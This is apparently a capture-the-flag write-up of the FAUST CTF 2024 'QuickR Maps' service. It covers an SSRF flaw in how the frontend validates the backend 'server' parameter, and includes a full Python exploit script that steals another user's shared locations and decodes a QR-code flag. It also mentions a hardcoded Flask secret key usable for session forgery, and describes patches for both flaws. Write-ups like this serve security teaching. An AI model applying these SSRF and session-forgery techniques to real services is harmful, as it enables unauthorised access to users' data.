---
title: "FAUST CTF 2024 QuickR Maps Writeup"
date: 2024-10-11T06:00:00+02:00
author: "Hackrrr"
tags: [ "writeups" ]
---

QuickR Maps service allows users to store and share locations on map. There are two instances hidden behind one frontend/proxy - public and private. Public instance shows all stored locations to everyone, private instace shows only locations accessible to you (that are either yours locations or locations explicitly shared with you).

## SSRF
Application had only one "frontend" which then handled to which instance/server will actually go. This is based on `server` GET parameter. Original logic for handling and validating looks like this (logic is basically same for every endpoint):
```py
@main.get('/api/locations')
def get_locations():
    server_host = request.args.get('server')
    server_url = f"http://{server_host}:4242/location/"
    u = urlparse(server_url)
    if u.hostname not in REGISTERED_PRIV_SERVERS + REGISTERED_PUB_SERVERS:
        flash("Server not supported", "danger")
        return redirect(url_for('main.add_location'))
    # ...
    requests.get(server_url, timeout=TIMEOUT)
    # ...
```

This is quite obviously flawed - first URL is constructed from user supplied value (`server` parameter) and then this "new" URL is validated/parsed to check if it is one of allowed backend instances/servers. This allows us (= attackers) to send basically any request to any backed server if we supply "correct" value to `server` paramters (e.g. `private_loc:4242/some/backend/endpoint&x=` becomes `http://private_loc:4242/some/backend/endpoint` (assuming that `x` is ignored by backend server (which is))).

We can use this ability to share locations from another user to us on private instance:
```py
session.post(
    f"http://[{host}]:4241/api/share",
    data={
        "server": f"private_loc:4242/share/{TARGET_USER}?receiver={OUR_USER_ID}&x=",
        "receiver": OUR_USER_ID,
    },
    allow_redirects=False,
)
```

*Note: Same/Similar could be done also on other (frontend) endpoints (e.g. bulk add).*

Patch is *really quite simple*, just don't use `urlparse()` at all and check `server_host` validity directly. This patch needs to be done for every endpoint.

## Getting the flag
Vulnerability was (at least for me) actually the easy part... Extracting the flag was the hard/annoying part. One would thought that flag would be stored in descripton of some location but no. We were little confused when we found out that there is no flag in descriptions of stolen locations (from checker/flagID user). So we had a look at map of stolen locations and saw one dense area of points... and when we zoomed in we realized that it is a QR code (it requires a bit of cleanup by showing only oldest locations/points).

Fist flag we submitted manully just by taking our mobile phone, scanning it from screen and sending it to game server (sorry team Spain) just as sanity check that this is actully thing we need to do. And then I spent not exactly small amount of time trying to parse QR code in Pyhton (this was so painful, I tried several different libraries for QR code parsing until I found something that worked somehow):
```py
import zxingcpp
import numpy
from PIL import Image

# Get the locations (assuming we already somehow got valid `session`)
locs = session.get(f"http://[{host}]:4241/api/locations?server=private_loc").json()

# Keep only oldest locations
timestamp = min(x["timestamp"] for x in locs)
filtered = [x for x in locs if x["timestamp"] == timestamp]

# Creating a "grid" so we can than translate lat/long to x/y
lats = set()
longs = set()
for x in filtered:
    lats.add(x["lat"])
    longs.add(x["lon"])
lats = sorted(lats)
longs = sorted(longs)

# Create QR code image
img = Image.new(mode="RGB", size=(len(lats), len(longs)), color=(255, 255, 255))
for x in filtered:
    img.putpixel((lats.index(x["lat"]), longs.index(x["lon"])), (0, 0, 0))

# Parse QR code
# This was the annoying part :)
cv_img = numpy.array(img.convert("RGB"))[:, :, ::-1].copy()
for x in zxingcpp.read_barcodes(cv_img):
    print(x.text)
```

And so final exploit looks like this:
```py
#!/usr/bin/env python3

import json
import random
import string
import sys

import numpy
import requests
import zxingcpp
from PIL import Image

host = ...
flag_id = ... # = Target username

def randstr(
    length: int, extra: str = "", chars: str = string.ascii_letters + string.digits
) -> str:
    return "".join(random.choices(chars + extra, k=length))

# Random "checker looking" username
user = f"striker_guardian_{randstr(32, chars="0123456789abcdef")}"
password = randstr(32, chars="0123456789abcdef")

# Register
session = requests.Session()
session.post(
    f"http://[{host}]:4241/register",
    data={"agent_alias": user, "password": password},
    allow_redirects=False,
)
# Login
r = session.post(
    f"http://[{host}]:4241/login",
    data={"agent_alias": user, "password": password},
)
# Getting our user ID
user_id = r.text.split('<div class="agent-id">ID: ', 1)[1].split("</div>", 1)[0]

# Exploit
session.post(
    f"http://[{host}]:4241/api/share",
    data={
        "server": f"private_loc:4242/share/{flag_id}?receiver={user_id}&x=",
        "receiver": user_id,
    },
    allow_redirects=False,
)

# Getting the flag
locs = session.get(f"http://[{host}]:4241/api/locations?server=private_loc").json()
timestamp = min(x["timestamp"] for x in locs)
filtered = [x for x in locs if x["timestamp"] == timestamp]

lats = set()
longs = set()
for x in filtered:
    lats.add(x["lat"])
    longs.add(x["lon"])
lats = sorted(lats)
longs = sorted(longs)

img = Image.new(mode="RGB", size=(len(lats), len(longs)), color=(255, 255, 255))
for x in filtered:
    img.putpixel((lats.index(x["lat"]), longs.index(x["lon"])), (0, 0, 0))

cv_img = numpy.array(img.convert("RGB"))[:, :, ::-1].copy()
for x in zxingcpp.read_barcodes(cv_img):
    print(x.text)
```

## Other way to the flag
There is also different "vulnerability". There is one specific line in `__init__.py`:
```py
app.config['SECRET_KEY'] = 'secret-key-goes-here'
```

We realized this like in half of whole A/D (and I'm being very optimistic here with this time) and so... well... yeah, ~~we~~ I'm dumb. :)

Anyway, you could use this key to then forge session as target user and just get its locations. Unfortunatelly we couldn't make it work as we stumbled upon some weird `flask-login` "internals"/problems that we weren't able to solve. Patch is trivial, just change key to something else.
